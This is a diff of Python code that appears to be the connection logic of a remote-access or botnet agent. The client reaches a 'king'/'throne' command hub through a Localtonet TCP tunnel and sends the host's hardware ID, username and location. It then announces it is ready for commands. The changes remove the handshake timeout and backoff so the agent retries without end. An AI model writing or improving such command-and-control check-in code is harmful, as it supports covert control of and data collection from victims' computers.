@@ -979,20 +979,21 @@ def _parse_king_destination(raw_value: str):
 
 
 def perform_persistent_handshake(sock, hwid, user, location, version):
-    """Send handshake repeatedly until KING_ACK is received or timeout occurs."""
+    """Keep sending the handshake every 2 seconds until KING_ACK is received."""
     handshake_message = f"NODE_DATA|{hwid}|{user}|{location}|{version}|END_HANDSHAKE\n"
     sock.setblocking(False)
-    buffer = ""
     last_send = 0
-    start_time = time.time()
 
     while True:
-        now = time.time()
-        if now - last_send >= 2:
+        current_time = time.time()
+        if current_time - last_send >= 2:
             try:
                 sock.sendall(handshake_message.encode('utf-8'))
-                print("[*] Handshake sent, waiting for KING_ACK...")
-                last_send = now
+                print("[*] Shouting handshake (waiting for KING_ACK)...")
+                last_send = current_time
+            except BlockingIOError:
+                # Send will retry on the next loop iteration
+                pass
             except Exception as e:
                 raise ConnectionError(f"Failed to send handshake: {e}")
 
@@ -1000,8 +1001,9 @@ def perform_persistent_handshake(sock, hwid, user, location, version):
             ack_bytes = sock.recv(1024)
             if ack_bytes == b'':
                 raise ConnectionError("Connection closed before KING_ACK")
-            buffer += ack_bytes.decode('utf-8', errors='ignore')
-            if "KING_ACK" in buffer:
+
+            ack_data = ack_bytes.decode('utf-8', errors='ignore')
+            if "KING_ACK" in ack_data:
                 print("[+] KING_ACK received! Handshake complete.")
                 break
         except BlockingIOError:
@@ -1009,10 +1011,7 @@ def perform_persistent_handshake(sock, hwid, user, location, version):
         except socket.timeout:
             pass
         except Exception as e:
-            raise ConnectionError(f"Handshake error: {e}")
-
-        if now - start_time > 25:
-            raise ConnectionError("Handshake timeout - no KING_ACK received after 25 seconds")
+            raise ConnectionError(f"Handshake receive error: {e}")
 
         time.sleep(0.1)
 
@@ -1021,12 +1020,8 @@ def perform_persistent_handshake(sock, hwid, user, location, version):
 
 
 def connect_to_king(king_url):
-    """Connect to hub with exponential backoff on failure."""
-    retry_delay = 5
-    max_delay = 60
-    
+    """Persistent Shouter: Keep sending handshake until KING_ACK is received."""
     while True:
-        s = None
         try:
             address = king_url.strip()
             if not address or ':' not in address:
@@ -1038,10 +1033,11 @@ def connect_to_king(king_url):
             if not host or not port.isdigit():
                 raise ValueError("Invalid throne host or port")
 
-            print(f"[*] Connecting to hub at {host}:{port}")
-            
+            print(f"[*] Localtonet destination from throne: {host}:{port}")
+            print(f"[*] Connecting directly to Localtonet TCP: {host}:{port}")
+
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
+            s.settimeout(10)
             s.connect((host, int(port)))
 
             user = get_username()
@@ -1049,11 +1045,9 @@ def connect_to_king(king_url):
             version = get_current_version()
             hwid = get_hwid()
 
-            print(f"[*] Performing handshake with HWID {hwid}")
             perform_persistent_handshake(s, hwid, user, location, version)
 
             print("[+] Connection Established - Ready for commands!")
-            retry_delay = 5  # Reset on successful connection
             return s
 
         except Exception as e:
@@ -1061,24 +1055,17 @@ def connect_to_king(king_url):
                 s.close()
             except Exception:
                 pass
-            print(f"[-] Connection failed: {e}")
-            print(f"[-] Retrying in {retry_delay} seconds...")
-            time.sleep(retry_delay)
-            # Exponential backoff with cap
-            retry_delay = min(retry_delay * 1.5, max_delay)
-            retry_delay = int(retry_delay)
+            print(f"[-] King not found ({e}). Retrying in 10 seconds...")
+            time.sleep(10)
 
 
 def connect_direct_hub(hub_ip, port, max_retries: int = 3):
-    """Connect directly to hub with proper handshake and timeout handling."""
-    print(f"[*] Attempting direct connection to {hub_ip}:{port}")
-    
+    """Connect directly to the command hub using raw TCP socket."""
+    print(f"[DEBUG] connect_direct_hub called with {hub_ip}:{port}")
     for attempt in range(max_retries):
-        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
-            print(f"[*] Attempt {attempt + 1}/{max_retries}: Connecting...")
+            s.settimeout(10)
             s.connect((hub_ip, port))
 
             user = get_username()
@@ -1086,22 +1073,21 @@ def connect_direct_hub(hub_ip, port, max_retries: int = 3):
             version = get_current_version()
             hwid = get_hwid()
 
-            print(f"[*] Connected, performing handshake...")
             perform_persistent_handshake(s, hwid, user, location, version)
 
-            print(f"[+] Direct connection to hub at {hub_ip}:{port} established successfully")
+            print(f"[+] Direct TCP connection established to hub at {hub_ip}:{port} with HWID")
             return s
         except Exception as e:
-            print(f"[-] Attempt {attempt + 1} failed: {e}")
             try:
                 s.close()
             except Exception:
                 pass
+            print(f"[-] [{attempt + 1}/{max_retries}] Connection attempt failed: {e}")
             if attempt < max_retries - 1:
-                time.sleep(2)
-    
-    print(f"[-] Direct connection failed after {max_retries} attempts")
-    return None
+                time.sleep(1)
+                continue
+            print(f"[-] Direct TCP connection failed after {max_retries} attempts")
+            return None
 
 
 def send_heartbeat(sock):
